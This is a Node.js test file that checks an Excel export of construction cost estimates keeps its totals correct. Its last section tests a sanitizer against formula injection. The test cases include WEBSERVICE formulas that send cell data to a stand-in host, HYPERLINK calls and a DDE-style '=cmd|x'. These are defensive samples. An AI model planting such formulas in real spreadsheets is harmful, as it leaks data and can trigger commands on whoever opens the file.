/*
 * The exported workbook, read back and computed.
 *
 * Every other test of the export looks at what was written. This one opens the file the way Excel does: it
 * evaluates each formula and asks whether the document still adds up — whether an ИТОГО is the sum of the lines
 * above it, on the smeta side and on the market side, in each of the three kinds of report. That is the
 * question a reader of the document asks, and two defects lived for a long time because no test asked it:
 *
 *   «Полная копия»   the re-priced lines are sorted by name inside the places they occupy. A total's
 *                    SUM(a:b) followed the lines that had stood at a and b to wherever they went: the range
 *                    shrank, turned upside down, or swallowed its own total (a circular reference).
 *   form 4А          an ИТОГО that the estimate carries as a typed number was copied to the market side as
 *                    the same number, so the market total stayed the smeta total whatever was re-priced.
 *
 * Names, quantities and prices are invented.
 *
 *   node test/export-formulas.cjs
 */
'use strict';
const { load } = require('./load.cjs');
const { makeSheetCalc } = require('./calc.cjs');

const S = load(load.PIPELINE);

let fail = 0;
const check = (ok, what) => { console.log((ok ? 'ok   ' : 'FAIL ') + what); if (!ok) fail++; };
const near = (a, b) => typeof a === 'number' && typeof b === 'number' && Math.abs(a - b) <= Math.max(1e-6, Math.abs(b) * 1e-9);

/** rows[r][c] = {v} or {f}; r and c from 1, as the reader returns them. */
function sheet(name, lines) {
  const rows = [];
  lines.forEach((line, i) => {
    const cells = [];
    line.forEach((v, c) => {
      if (v == null) return;
      cells[c + 1] = typeof v === 'string' && v[0] === '=' ? { f: v } : { v };
    });
    rows[i + 1] = cells;
  });
  return { name, rows };
}

/* ------------------------------------------------------------------ the two estimates */

/**
 * An ordinary resource sheet: the totals are formulas, as the estimating program writes them. The names are
 * chosen so that sorting the re-priced ones by name carries them across the bands and past the totals.
 */
function standardSheet(name, k) {
  const L = [];
  const add = (line) => { L.push(line); return L.length; };
  add(['ТЕСТОВАЯ СТРОЙКА']);
  add(['ТЕСТОВАЯ УЛИЦА ' + name]);
  add([]);
  add(['N п/п', 'НАИМЕНОВАНИЕ', 'ЕД. ИЗМ.', 'КОЛ-ВО', 'ЦЕНА ЗА ЕД.', 'СУММА (сум)']);
  add([1, 2, 3, 4, 5, 6]);
  const item = (no, nm, unit, qty, price) => { const r = L.length + 1; return add([no, nm, unit, qty, price, '=D' + r + '*E' + r]); };
  const total = (from, to) => { return add(['ИТОГО', null, 'СУМ', null, null, '=SUM(F' + from + ':F' + to + ')']); };
  const totals = [];
  add(['ЗАТРАТЫ ТРУДА']);
  let a = item(1, 'ЯЧЕЙКА ТЕСТОВАЯ РАБОЧИХ', 'ЧЕЛ.-Ч', 10 * k, 11);
  let b = item(2, 'ЗАТРАТЫ ТРУДА ТЕСТОВЫХ МАШИНИСТОВ', 'ЧЕЛ.-Ч', 4, 13);
  totals.push(total(a, b));
  add(['СТРОИТЕЛЬНЫЕ МАШИНЫ И МЕХАНИЗМЫ']);
  a = item(1, 'ЭКСКАВАТОР ТЕСТОВЫЙ', 'МАШ.-Ч', 3, 170);
  item(2, 'БУЛЬДОЗЕР ТЕСТОВЫЙ', 'МАШ.-Ч', 2 * k, 190);
  b = item(3, 'КРАН ТЕСТОВЫЙ 10 Т', 'МАШ.-Ч', 5, 230);
  totals.push(total(a, b));
  add(['СТРОИТЕЛЬНЫЕ МАТЕРИАЛЫ И КОНСТРУКЦИИ']);
  a = item(1, 'ЩЕБЕНЬ ТЕСТОВЫЙ', 'М3', 9, 14);
  item(2, 'АРМАТУРА ТЕСТОВАЯ 12 ММ', 'Т', 6, 860);
  item(3, 'ПЕСОК ТЕСТОВЫЙ', 'М3', 12 * k, 8.5);
  item(4, 'ЦЕМЕНТ ТЕСТОВЫЙ М400', 'Т', 4, 115);
  b = item(5, 'ВОДА ТЕСТОВАЯ', 'М3', 7, 0.75);
  totals.push(total(a, b));
  add(['ВСЕГО', null, 'СУМ', null, null, '=' + totals.map((t) => 'F' + t).join('+')]);
  return sheet(name, L);
}
const standardBook = () => ({ sheets: [standardSheet('УЛ1', 1), standardSheet('УЛ2', 3)] });

/** Form 4А: every total is a typed number. One of them does not agree with its own lines. */
function form4aBook() {
  const line = (no, nm, unit, qty, price) => [String(no), null, nm, unit, qty, price, qty * price];
  const est = (no, works, rows, direct) => [
    [null, null, ' ЛОКАЛЬНЫЙ   РЕСУРСНЫЙ   СМЕТНЫЙ   РАСЧЕТ', no],
    [null, 'на', works],
    ['Наименование объекта -', null, 'ТЕСТОВЫЙ ОБЪЕКТ'],
    [],
    ['№ п/п', 'Шифр ресурсов', 'Наименование ресурсов, оборудования, конструкций, изделий и  деталей',
      'Единица измерения', 'Количество единиц', 'Сметная стоимость'],
    [null, null, null, null, null, 'на единицу', 'общая'],
    [1, 2, 3, 4, 5, 6, 7],
    ...rows,
    [null, null, 'ИТОГО ПРЯМЫЕ ЗАТРАТЫ', 'СУМ', null, null, direct],
    [], []
  ];
  const first = est('№ 1', 'ОБЩЕСТРОИТЕЛЬНЫЕ РАБОТЫ', [
    [null, null, 'ТРУДОВЫЕ РЕСУРСЫ'],
    line(1, 'ЗАТРАТЫ ТРУДА ТЕСТОВЫХ РАБОЧИХ', 'ЧЕЛ.-Ч', 10, 11),
    [null, null, 'ИТОГО ТРУДОВЫЕ РЕСУРСЫ', 'СУМ', null, null, 110],
    [null, null, 'СТРОИТЕЛЬНЫЕ МАШИНЫ И МЕХАНИЗМЫ'],
    line(1, 'КРАН ТЕСТОВЫЙ 10 Т', 'МАШ.-Ч', 2, 13),
    [null, null, 'В Т.Ч. ЗАТРАТЫ ТРУДА МАШИНИСТОВ, ЭКИПАЖ 1 ЧЕЛ.', 'ЧЕЛ.-Ч', 2, null, '-'],
    line(2, 'БУЛЬДОЗЕР ТЕСТОВЫЙ', 'МАШ.-Ч', 3, 19),
    [null, null, 'ИТОГО СТРОИТЕЛЬНЫЕ МАШИНЫ И МЕХАНИЗМЫ', 'СУМ', null, null, 83],
    [null, null, 'СТРОИТЕЛЬНЫЕ МАТЕРИАЛЫ И КОНСТРУКЦИИ'],
    line(1, 'ЩЕБЕНЬ ТЕСТОВЫЙ', 'М3', 4, 17),
    line(2, 'АНКЕР ТЕСТОВЫЙ М8', 'ШТ', 3, 19),
    line(3, 'ПЕСОК ТЕСТОВЫЙ', 'М3', 2, 7),
    [null, null, 'ИТОГО СТРОИТЕЛЬНЫЕ МАТЕРИАЛЫ И КОНСТРУКЦИИ', 'СУМ', null, null, 139]
  ], 332);
  // the second estimate: its band total was typed over (its lines come to 63, the estimate says 70)
  const second = est('№ 2', 'ТЕСТОВЫЕ СЕТИ', [
    [null, null, 'СТРОИТЕЛЬНЫЕ МАТЕРИАЛЫ И КОНСТРУКЦИИ'],
    line(1, 'ТРУБА ТЕСТОВАЯ 50 ММ', 'М', 2, 17),
    line(2, 'ЩИТ ТЕСТОВЫЙ', 'ШТ', 1, 29),
    [null, null, 'ИТОГО СТРОИТЕЛЬНЫЕ МАТЕРИАЛЫ И КОНСТРУКЦИИ', 'СУМ', null, null, 70]
  ], 70);
  second[0] = [];
  return { sheets: [sheet('РА', [[null, null, null, null, null, 'Форма 4А АВС-4'],
    ['Наименование стройки -', null, 'ТЕСТОВАЯ СТРОЙКА'], [], ...first, ...second])] };
}

/* ------------------------------------------------------------------ what the document must say */

const isDirect = (label) => /ПРЯМЫЕ|^ВСЕГО/.test(S.nameKey(label));
const labelOf = (row, cols) => { for (const c of cols) { const v = row.cells[c] && row.cells[c].v; if (v != null && v !== '') return String(v); } return ''; };

/**
 * Walk rows that carry `kind`, `qty`, `price`, `market`, and say what each total row ought to show: a band
 * total is the lines since its band began, a «ПРЯМЫЕ ЗАТРАТЫ» / «ВСЕГО» line the lines of its whole estimate.
 * `slack` is what a typed total already differed from its own lines by in the estimate itself — the document
 * keeps that difference on both sides rather than hiding it.
 */
function expected(rows, labelCols, slack) {
  const out = [];
  let band = { s: 0, m: 0 }, object = { s: 0, m: 0 };
  rows.forEach((row, i) => {
    if (row.kind === 'title' || row.kind === 'object' || row.kind === 'header') { object = { s: 0, m: 0 }; band = { s: 0, m: 0 }; }
    else if (row.kind === 'section') band = { s: 0, m: 0 };
    else if (row.kind === 'item') {
      const s = (row.qty || 0) * row.price, m = (row.qty || 0) * row.market;
      band.s += s; band.m += m; object.s += s; object.m += m;
    } else if (row.kind === 'total') {
      const label = labelOf(row, labelCols);
      const of = isDirect(label) ? object : band;
      const extra = slack && slack[S.nameKey(label) + '#' + out.filter((t) => S.nameKey(t.label) === S.nameKey(label)).length] || 0;
      out.push({ at: i + 1, label, s: of.s + extra, m: of.m + extra });
      if (!isDirect(label)) band = { s: 0, m: 0 };
    }
  });
  return out;
}

/** Every formula of a sheet computes, and no range runs backwards. */
function soundFormulas(sh, what, mayBeEmpty) {
  const calc = makeSheetCalc(sh);
  let n = 0; const bad = [];
  sh.rows.forEach((row, r) => (row || []).forEach((c, ci) => {
    if (!c || c.f == null) return;
    n++;
    const v = calc.value(r, ci);
    if (v && v.err) bad.push(S.col(ci) + r + ' ' + c.f + ' → ' + v.err);
    const re = /\$?[A-Z]{1,3}\$?(\d+):\$?[A-Z]{1,3}\$?(\d+)/g; let m;
    while ((m = re.exec(c.f))) if (+m[2] < +m[1]) bad.push(S.col(ci) + r + ' ' + c.f + ' → range runs backwards');
  }));
  check((n > 0 || mayBeEmpty) && !bad.length, what + ': ' + n + ' formulas, all compute' + (bad.length ? ' — ' + bad.length + ' do not, e.g. ' + bad.slice(0, 3).join(' | ') : ''));
  return calc;
}

function totalsAgree(calc, want, colS, colM, what, mayBeEmpty) {
  const bad = [];
  want.forEach((t) => {
    const s = calc.value(t.at, colS), m = calc.value(t.at, colM);
    if (!near(s, t.s)) bad.push('row ' + t.at + ' «' + t.label.trim() + '» smeta ' + JSON.stringify(s) + ', its lines ' + t.s);
    if (!near(m, t.m)) bad.push('row ' + t.at + ' «' + t.label.trim() + '» market ' + JSON.stringify(m) + ', its lines ' + t.m);
  });
  check((want.length > 0 || mayBeEmpty) && !bad.length, what + ': ' + want.length + ' totals equal their lines' + (bad.length ? ' — ' + bad.length + ' do not, e.g. ' + bad.slice(0, 2).join(' | ') : ''));
}

/** One estimate, one set of prices, the three kinds of report. */
function run(tag, objects, prices, slack) {
  const model = S.assemble([{ id: 'p', name: 'Тест', title: 'ТЕСТ', objects }], prices);
  const all = model.rows.filter((r) => r.kind === 'item');
  const sumS = all.reduce((a, r) => a + (r.qty || 0) * r.price, 0), sumM = all.reduce((a, r) => a + (r.qty || 0) * r.market, 0);
  const moved = all.filter((r) => !S.near(r.price, r.market));
  const C = model.cols, R = S.report.cols;

  ['changed', 'dedup', 'full'].forEach((mode) => {
    const opts = { mode, minDiff: 0 };
    const wb = S.readXlsx(S.buildWorkbook(model, opts));
    const where = tag + ', ' + mode;

    // «Лист1»: the assembled estimate, the same in every mode
    const main = soundFormulas(wb.sheets[0], where + ', Лист1');
    totalsAgree(main, expected(model.rows, [C.NO, C.NAME], slack), C.SUM, C.MSUM, where + ', Лист1');

    // the report sheet
    const rep = S.report.build(model, model.spans[0], opts);
    // «Только изменённые» of an estimate nobody re-priced is an empty table, and that is right
    const empty = mode === 'changed' && !moved.length;
    const calc = soundFormulas(wb.sheets[1], where + ', report', empty);
    if (mode === 'full') {
      totalsAgree(calc, expected(rep.rows, [R.NO, R.NAME], slack), R.SUM, R.MSUM, where + ', report');
      // and nothing is lost or counted twice by the sort: the lines of the sheet still come to the estimate
      let s = 0, m = 0;
      rep.rows.forEach((row, i) => { if (row.kind === 'item') { s += calc.value(i + 1, R.SUM); m += calc.value(i + 1, R.MSUM); } });
      check(near(s, sumS) && near(m, sumM), where + ', report: the lines come to the whole estimate (' + sumM + ')');
    } else {
      totalsAgree(calc, expected(rep.rows, [R.NO, R.NAME]), R.SUM, R.MSUM, where + ', report', empty);
      const grand = rep.rows.findIndex((r) => r.kind === 'grandtotal') + 1;
      const of = mode === 'dedup' ? all : moved;
      const wantS = of.reduce((a, r) => a + (r.qty || 0) * r.price, 0), wantM = of.reduce((a, r) => a + (r.qty || 0) * r.market, 0);
      if (of.length) check(grand > 0 && near(calc.value(grand, R.SUM), wantS) && near(calc.value(grand, R.MSUM), wantM),
        where + ', report: ЖАМИ is the sum of its lines (' + wantM + ')');
      else check(grand === 0, where + ', report: nothing re-priced, no ЖАМИ line');
    }
  });
}

/* ------------------------------------------------------------------ the runs */

const k = (nm, unit, p) => S.resKey(nm, unit, p);

// the ordinary sheet, nothing re-priced: the plain copy
run('standard, no prices', S.smeta.parseWorkbook(standardBook(), 'a.xlsx'), {});

// re-priced lines in every band; sorted by name they change bands: АРМАТУРА goes to the top of the first
// street, ЯЧЕЙКА to the bottom of the second
const std = {};
std[k('ЯЧЕЙКА ТЕСТОВАЯ РАБОЧИХ', 'ЧЕЛ.-Ч', 11)] = 9;
std[k('ЭКСКАВАТОР ТЕСТОВЫЙ', 'МАШ.-Ч', 170)] = 150;
std[k('КРАН ТЕСТОВЫЙ 10 Т', 'МАШ.-Ч', 230)] = 240;
std[k('АРМАТУРА ТЕСТОВАЯ 12 ММ', 'Т', 860)] = 790;
std[k('ВОДА ТЕСТОВАЯ', 'М3', 0.75)] = 0.5;
std[k('ЩЕБЕНЬ ТЕСТОВЫЙ', 'М3', 14)] = 11.8;
run('standard, re-priced', S.smeta.parseWorkbook(standardBook(), 'a.xlsx'), std);

// every line re-priced
const every = {};
S.smeta.parseWorkbook(standardBook(), 'a.xlsx').forEach((o) => o.rows.forEach((r) => {
  if (r.kind === 'item') every[k(r.nm, r.unit, r.price)] = Math.round(r.price * 90) / 100;
}));
run('standard, all −10 %', S.smeta.parseWorkbook(standardBook(), 'a.xlsx'), every);

// form 4А. The second estimate's band total says 70 where its lines come to 63: the document keeps those 7 on
// both sides, and the «ПРЯМЫЕ ЗАТРАТЫ» line that repeats the 70 keeps them too.
const slack = {};
slack[S.nameKey('ИТОГО СТРОИТЕЛЬНЫЕ МАТЕРИАЛЫ И КОНСТРУКЦИИ') + '#1'] = 7;
slack[S.nameKey('ИТОГО ПРЯМЫЕ ЗАТРАТЫ') + '#1'] = 7;
run('form 4А, no prices', S.smeta.parseWorkbook(form4aBook(), 'b.xlsx'), {}, slack);
const f4 = {};
f4[k('КРАН ТЕСТОВЫЙ 10 Т', 'МАШ.-Ч', 13)] = 11;
f4[k('ЩЕБЕНЬ ТЕСТОВЫЙ', 'М3', 17)] = 15;
f4[k('АНКЕР ТЕСТОВЫЙ М8', 'ШТ', 19)] = 16;
f4[k('ТРУБА ТЕСТОВАЯ 50 ММ', 'М', 17)] = 12;
run('form 4А, re-priced', S.smeta.parseWorkbook(form4aBook(), 'b.xlsx'), f4, slack);

/* ------------------------------------------------------------------ a formula that does more than add */
/*
 * The estimate comes from outside, and its formulas go into a document that is signed and sent on. A total
 * written as =SUM(…)+0*LEN(WEBSERVICE("http://…")) is still a total, and calls an address when the document is
 * opened. Only formulas made of the plain functions an estimate needs are carried alive; the rest go in as the
 * numbers the estimate shows, and are counted.
 */
{
  const u = S.formula.unsafe;
  check(u('=SUM(G8:G15)').length === 0 && u('=ROUND(D7*E7,2)').length === 0 && u('=IF(A1>0,VLOOKUP(A1,B1:C9,2,0),0)').length === 0 && u('=D7*E7').length === 0,
    'sums, rounding, conditions and look-ups are plain');
  check(u('=SUM(G8:G15)+0*LEN(WEBSERVICE("http://x/"))').join() === 'WEBSERVICE' && u('=HYPERLINK("http://x","a")').join() === 'HYPERLINK' &&
    u('=_xlfn.WEBSERVICE(A1)').join() === 'WEBSERVICE', 'a function that reaches outside is named, however it is spelled');
  check(u('="WEBSERVICE("&A1').length === 0, 'the word inside a text is only a text');
  check(u('=[1]Лист1!A1').length === 1 && u('=cmd|x').length === 1 && u('=НОВАЯ(A1)').length === 1, 'a link to another workbook, a DDE channel and an unknown function are not plain');

  const sh = (rows) => { const out = []; rows.forEach((line, i) => { const cells = []; line.forEach((v, c) => { if (v == null) return;
    cells[c + 1] = v && v.f ? { f: v.f, v: v.v } : { v }; }); out[i + 1] = cells; }); return { name: 'УЛ1', rows: out }; };
  const book = { sheets: [sh([
    ['ТЕСТОВАЯ СТРОЙКА'], ['ТЕСТОВАЯ УЛИЦА'], [],
    ['СТРОИТЕЛЬНЫЕ МАТЕРИАЛЫ И КОНСТРУКЦИИ'],
    [1, 'ЩЕБЕНЬ ТЕСТОВЫЙ', 'М3', 4, 17, { f: '=D5*E5', v: 68 }],
    [2, 'АНКЕР ТЕСТОВЫЙ М8', 'ШТ', 3, 19, { f: '=D6*E6', v: 57 }],
    ['ИТОГО', null, 'СУМ', null, null, { f: '=SUM(F5:F6)+0*LEN(WEBSERVICE("http://example.invalid/"&F5))', v: 125 }],
    [null, 'ТРАНСПОРТНЫЕ УСЛУГИ', 'СУМ', null, null, { f: '=ROUND(F7*0.05,0)', v: 6 }],
    [null, 'ССЫЛКА', 'СУМ', null, null, { f: '=HYPERLINK("http://example.invalid/","1")', v: 1 }]
  ])] };
  const objects = S.smeta.parseWorkbook(book, 'x.xlsx');
  const model = S.assemble([{ id: 'p', name: 'Тест', title: 'ТЕСТ', objects }], {});
  check(model.frozen.count === 2 && model.frozen.names.join() === 'HYPERLINK,WEBSERVICE', 'the model counts the formulas it did not carry alive and names their functions (' + JSON.stringify(model.frozen) + ')');
  ['changed', 'dedup', 'full'].forEach((mode) => {
    const wb = S.readXlsx(S.buildWorkbook(model, { mode, minDiff: 0 }));
    const all = [];
    wb.sheets.forEach((s2) => s2.rows.forEach((row) => (row || []).forEach((c) => { if (c) all.push(c); })));
    const live = all.filter((c) => c.f != null).map((c) => c.f);
    check(!live.some((f) => /WEBSERVICE|HYPERLINK/i.test(f)) && !all.some((c) => typeof c.v === 'string' && /^=.*WEBSERVICE/i.test(c.v)),
      mode + ': no formula of the document calls outside (' + live.length + ' formulas)');
    if (mode === 'full') {
      const main = wb.sheets[0], C = model.cols;
      const total = model.rows.find((r) => r.kind === 'total'), over = model.rows.filter((r) => r.kind === 'extra');
      const cell = (r, c) => main.rows[r.r][c];
      // its number is then a typed total like any other, and is traced back to the lines it is the sum of
      check(/^=SUM\(G\d+:G\d+\)$/.test(cell(total, C.SUM).f) && /^=SUM\(I\d+:I\d+\)$/.test(cell(total, C.MSUM).f) && makeSheetCalc(main).value(total.r, C.MSUM) === 125,
        'the total that called outside is a plain sum of its lines again, on both sides (' + cell(total, C.SUM).f + ')');
      check(/^=ROUND\(G\d+\*0\.05,0\)$/.test(cell(over[0], C.SUM).f) && /^=ROUND\(I\d+\*0\.05,0\)$/.test(cell(over[0], C.MSUM).f), 'the overhead next to it, a plain formula, is still alive on both sides');
      check(cell(over[1], C.SUM).f == null && cell(over[1], C.SUM).v === 1, 'a link is a value');
    }
  });
  const plain = S.assemble([{ id: 'p', name: 'Тест', title: 'ТЕСТ', objects: S.smeta.parseWorkbook(standardBook(), 'a.xlsx') }], {});
  check(plain.frozen.count === 0, 'an ordinary estimate has nothing of the kind');
}

console.log(fail ? '\nFAILED: ' + fail : '\nall passed');
process.exit(fail ? 1 : 0);
